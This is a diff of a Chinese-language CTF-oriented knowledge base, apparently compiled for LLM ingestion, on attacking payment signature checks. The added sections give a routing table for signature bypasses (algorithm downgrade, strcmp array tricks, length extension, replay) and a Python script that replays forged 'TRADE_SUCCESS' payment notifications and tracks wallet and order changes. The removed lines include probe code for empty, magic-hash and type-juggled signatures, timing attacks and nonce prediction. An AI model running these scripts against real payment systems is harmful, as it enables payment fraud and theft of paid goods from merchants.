@@ -1,7 +1,7 @@
 # ReverseLab — Full Knowledge Base Dump for LLM Ingestion
 
 Total articles: 178
-Generated: 2026-07-03
+Generated: 2026-07-04
 
 ---
 ## [ctf-website] 24h Loop Orchestration
@@ -17133,6 +17133,42 @@ flowchart TD
 
 ---
 
+## 00.1 签名到支付账本路由
+
+签名题不要停在“验签通过”。支付、订阅、积分、下载链接这类场景必须继续读订单、流水、权益和钱包状态，证明签名绕过造成了持久化副作用。
+
+| 签名信号 | 优先路由 | 业务字段 | 命中标志 | 下一篇 |
+|---|---|---|---|---|
+| `sign_type`, `alg`, `algorithm` 可控 | 算法降级 / none / RS-HS confusion | `trade_status`, `amount`, `role` | 同 payload 换算法后状态推进 | `01-algorithm.md` |
+| `==`, `strcmp`, 空签名、异常吞掉 | 实现缺陷 | `status`, `paid`, `is_admin` | invalid sign 变 success | `02-implementation.md` |
+| `.env`, sourcemap, `pay_secret` | 密钥攻击 | `out_trade_no`, `transaction_id` | 可生成 provider 风格签名 | `03-key-attacks.md` |
+| 重复参数、JSON 重复 key、URL 编码差异 | 规范化绕过 | `amount`, `total_fee`, `order_id` | 签名覆盖值与业务读取值不同 | `04-canonicalization.md` |
+| `md5(secret + data)` / `sha1(secret + data)` | 长度扩展 | 追加 `&status=paid` / `&admin=1` | 原签名扩展后仍接受 | `05-length-extension.md` |
+| `nonce`, `timestamp`, `notify_id` | 重放与幂等绕过 | `transaction_id`, `delivery_id` | 多次发货/余额/权益变化 | `06-replay-nonce.md` |
+
+```python
+# signature_payment_router.py
+import re
+
+ROUTES = [
+    (re.compile(r"sign_type|algorithm|alg\b|none|RS256|HS256", re.I), "01-algorithm"),
+    (re.compile(r"strcmp|==|compare|empty sign|null|exception", re.I), "02-implementation"),
+    (re.compile(r"secret|pay_key|merchant_key|webhook_secret|\\.env|sourcemap", re.I), "03-key-attacks"),
+    (re.compile(r"canonical|sort|duplicate|hpp|urlencode|json key|amount=.*amount=", re.I), "04-canonicalization"),
+    (re.compile(r"md5\\(|sha1\\(|sha256\\(|secret \\+ data|data \\+ secret", re.I), "05-length-extension"),
+    (re.compile(r"nonce|timestamp|notify_id|transaction_id|idempotency", re.I), "06-replay-nonce"),
+]
+
+def route_signature_signal(signal):
+    hits = [target for rx, target in ROUTES if rx.search(signal)]
+    return hits or ["00-overview: collect more signed samples"]
+
+for signal in ["sign_type=MD5&amount=0.01", "same transaction_id new notify_id"]:
+    print(signal, "=>", route_signature_signal(signal))
+```
+
+Evidence 最小闭环：`signed_request.http`、`canonical_string.txt`、`signature_variant_matrix.csv`、`payment_ledger_before_after.json`。如果只有 `200 OK`，但订单、流水、权益、钱包没有变化，这轮不能算命中。
+
 ## 0. 签名机制分类学
 
 下表按**业务场景**归类，帮你快速定位正在面对的是什么类型的签名。
@@ -17305,69 +17341,7 @@ def decide_tree(base_url: str, sample_body: dict = None):
         body_magic = dict(sample_body)
         body_magic["sign"] = magic
         st, _, text = quick_probe(base_url, json=body_magic)
-        if st in (200, 302):
-            print(f"  [!] magic hash {magic[:20]}... 返回 {st}")
-            print(f"  body={text[:100]}")
-
-    # (4) strcmp 数组绕过
-    print("\n[4] PHP strcmp 数组绕过测试...")
-    body_array = dict(sample_body)
-    body_array["sign[]"] = "test"
-    st, _, text = quick_probe(base_url, data=body_array)
-    if st in (200, 302):
-        print(f"  [!] sign[]=test 返回 {st} — strcmp 数组绕过可能")
-        print(f"  body={text[:100]}")
-
-    # (5) JSON 类型戏法
-    print("\n[5] JSON 类型戏法测试...")
-    types = [True, False, None, 0, 0.0, "", [], {}]
-    for val in types:
-        body_type = dict(sample_body)
-        body_type["sign"] = val
-        st, _, text = quick_probe(base_url, json=body_type)
-        if st in (200, 302):
-            print(f"  [!] sign={repr(val)} 返回 {st}")
-            print(f"  body={text[:100]}")
-
-    # (6) 时序基线
-    print("\n[6] 时序基线采样 (100次)...")
-    timings = []
-    for i in range(100):
-        t0 = time.perf_counter()
-        S.post(base_url, json=sample_body, timeout=10)
-        timings.append((time.perf_counter() - t0) * 1000)
-    avg = sum(timings) / len(timings)
-    std = (sum((t - avg) ** 2 for t in timings) / len(timings)) ** 0.5
-    print(f"  avg={avg:.3f}ms  std={std:.3f}ms")
-    if std > 0.5:
-        print(f"  [*] 时序抖动较大 (std={std:.3f}) — 可能不适合 timing attack")
-    else:
-        print(f"  [!] 时序稳定 (std={std:.3f}) — timing attack 可行")
-
-    print("\n" + "=" * 60)
-    print("  [决策树] 扫描完成")
-    print("=" * 60)
-
-
-if __name__ == "__main__":
-    # 示例: python decision_tree_probe.py "https://target/api/payment/notify"
-    # 或用 sample_body 自定义
-    from urllib.parse import urlparse
-    if len(sys.argv) > 1:
-        base = sys.argv[1]
-        sample = {k: "test" for k in ["order_id", "amount", "status", "sign"]}
-        decide_tree(base, sample)
-    else:
-        print("Usage: python decision_tree_probe.py <target_url>")
-```
-
----
-
-## 3. 签名攻击武器库
-
-| # | 攻击名称 | 适用上下文 | 难度 | 影响 | Code Snippet (一行版) |
-|---|---------|-----------|------|------|----------------------|
-| 1 | **空签名** | 支付回调、API、Webhook | ⭐ | 极高 | `{"sign": ""}`
+        if st in (200, 302)
 
 [... content truncated for size ...]
 
@@ -19066,6 +19040,80 @@ def concurrent_replay(order_id, n=20):
     }, ensure_ascii=False, indent=2))
 ```
 
+### 0.2 幂等账本时间线
+
+支付重放的真正目标是 idempotency key 选错、消费时机错、唯一约束没覆盖业务字段。每轮重放都要同时记录 `notify_id`、`transaction_id`、订单状态、流水数、权益数和钱包差分。
+
+| 幂等字段 | 常见错误 | 变体 | 命中标志 |
+|---|---|---|---|
+| `notify_id` | 只按通知 ID 去重 | same tx / new notify | 同交易多次发货 |
+| `transaction_id` | 未规范化 | `TX1`, `tx1`, `TX1 `, `TX1%00` | 多条 payment log |
+| `order_id` | 只按订单去重但发货不幂等 | same order / new delivery | 多个 license/download |
+| `provider` | 唯一键缺 provider 或 provider 可控 | `wechat` → `mock` | 跨通道重复入账 |
+| `timestamp` | 签名窗口大但 nonce 未消费 | 旧 ts / 未来 ts | 过期请求仍有副作用 |
+
+```python
+# replay_idempotency_timeline.py
+import csv
+import time
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def read_state(order_id):
+    probes = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/delivery",
+        "wallet": "/api/wallet",
+        "me": "/api/me",
+    }
+    out = {}
+    for name, path in probes.items():
+        r = S.get(BASE + path, timeout=8, allow_redirects=False)
+        out[name] = f"{r.status_code}:{len(r.text)}:{r.text[:160].replace(chr(10), ' ')}"
+    return out
+
+def send_notify(order_id, tx, notify, provider="mock"):
+    body = {
+        "out_trade_no": order_id,
+        "transaction_id": tx,
+        "notify_id": notify,
+        "provider": provider,
+        "trade_status": "TRADE_SUCCESS",
+        "total_amount": "0.01",
+    }
+    return S.post(BASE + "/notify", json=body, timeout=10, allow_redirects=False)
+
+def replay_timeline(order_id, variants, out_csv="exports/replay_idempotency_timeline.csv"):
+    rows = []
+    rows.append({"phase": "before", "variant": "", "response": "", **read_state(order_id)})
+    for i, v in enumerate(variants):
+        r = send_notify(order_id, **v)
+        rows.append({
+            "phase": "after_replay",
+            "variant": repr(v),
+            "response": f"{r.status_code}:{len(r.text)}:{r.text[:160]}",
+            **read_state(order_id),
+        })
+        time.sleep(0.2)
+    rows.append({"phase": "after_settle", "variant": "", "response": "", **read_state(order_id)})
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=list(rows[0]))
+        w.writeheader()
+        w.writerows(rows)
+
+replay_timeline("ORD1", [
+    {"tx": "TX1", "notify": "N1"},
+    {"tx": "TX1", "notify": "N2"},
+    {"tx": "tx1", "notify": "N3"},
+    {"tx": "TX1 ", "notify": "N4"},
+])
+```
+
+判定顺序：先看 `payment/delivery/wallet/me` 是否随每个变体继续变化，再看最终 `after_settle` 是否回滚。只有响应 200、账本不变，说明幂等层生效；响应失败但权益增加，说明副作用发生在返回错误之前，继续压并发窗口。
+
 ## 1. 纯重放攻击
 
 ### 1.1 基础重放
@@ -19246,98 +19294,7 @@ def exploit_sequential_nonce():
     print(f"[*] Predicted next nonce: {next_nonce}")
 
     # 如果签名是 MD5(secret + nonce + data)，可以预计算未来 nonce 的签名
-    # 但这需要知道 secret（长度扩展攻击）或 secret 本身就是 nonce（弱）
-```
-
-### 2.2 时间戳 Nonce
-
-```python
-def analyze_time_based_nonce():
-    """
-    分析 nonce 是否基于时间
-
-    常见模式:
-    - timestamp_ms: 1700000000123 (微妙级)
-    - date_str: "20240101120000"
-    - base64(ts): "MTcwMDAwMDAwMA=="
-    - hash(timestamp): MD5(str(time.time()))
-    """
-    nonces = []
-    timestamps = []
-
-    for _ in range(10):
-        r = S.post(BASE + "/api/nonce", json={})
-        data = r.json()
-        nonces.append(data.get("nonce"))
-        timestamps.append(time.time())
-
-    import base64
-    for i, (nonce, ts) in enumerate(zip(nonces, timestamps)):
-        ts_int = int(ts)
-
-        # 检查 nonce 是否等于 timestamp
-        if isinstance(nonce, int):
-            diff = abs(nonce - ts_int * 1000)  # 毫秒
-            if diff < 10000:  # 10 秒内
-                print(f"[!] Nonce = timestamp(ms) diff={diff}ms")
-                return "timestamp_ms"
-
-            diff_s = abs(nonce - ts_int)
-            if diff_s < 10:  # 秒
-                print(f"[!] Nonce = timestamp(s) diff={diff_s}s")
-                return "timestamp_s"
-
-        # 检查 base64 解码
-        if isinstance(nonce, str):
-            try:
-                decoded = base64.b64decode(nonce)
-                if decoded.isdigit():
-                    ts_decoded = int(decoded)
-                    if abs(ts_decoded - ts_int * 1000) < 10000:
-                        print(f"[!] Nonce = base64(timestamp_ms)")
-                        return "b64_timestamp_ms"
-            except:
-                pass
-
-    return "unknown"
-```
-
-### 2.3 弱随机 Nonce
-
-```python
-def predict_weak_random_nonce():
-    """
-    攻击弱随机数生成器
-
-    可预测的随机源:
-    - Math.random() in JS (XorShift128+)
-    - rand() in PHP (LCG)
-    - random.randint in Python (Mersenne Twister, 624 连续值可预测)
-    - java.util.Random (LCG, 2^48 状态)
-    """
-
-    # PHP rand() 和 Python random 的差异:
-    # PHP rand() 是 LCG: seed = (seed * A + C) % M
-    # 如果拿到连续 2 个值可以恢复大部分实现的状态
-
-    nonces = []
-    for _ in range(1000):  # 收集足够样本
-        r = S.post(BASE + "/api/nonce", json={})
-        nonces.append(r.json().get("nonce"))
-
-    # 检查单调性
-    # 弱随机数在"重启"后种子相同 → 每次启动后 nonce 序列相同
-    # 重启攻击: 重启页面/容器 → 新的 nonce 序列可预测
-
-    # 测试: 如果 nonce 是整数且序列在每次 login/start 从同一值开始
-    first_ten = nonces[:10]
-    if first_ten == [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
-        print("[!] Nonce always starts from 1 (resets on session)")
-
-    # Mersenne Twister 恢复
-    # 如果知道系统使用 Python random，收集 624 个整数 → 可完全恢复状态
-    if len(set(nonces)) > 100:
-        print(f"[*] Nonce seems random, checking i
+    # 但这需要知道 secret（长
 
 [... content truncated for size ...]
 
